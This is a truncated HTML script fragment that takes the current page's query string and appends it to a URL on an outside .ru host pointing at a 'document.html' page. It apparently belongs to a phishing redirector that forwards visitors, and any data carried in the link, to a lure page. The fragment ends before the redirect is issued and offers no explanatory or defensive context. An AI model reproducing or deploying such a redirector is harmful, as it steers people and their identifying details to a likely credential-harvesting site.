<script>

    var currentURL = window.location.href;

    // Get everything after the '?' sign
    var queryString = currentURL.split('?')[1];

    // Build the redirect URL
    var redirectURL = 'https://iletin.ru/em/feedbacks/c378938b-c0eb-40c1-b99e-338dd9e776a8/document.html?' + queryString; // DO NOT REMOVE THE "?"
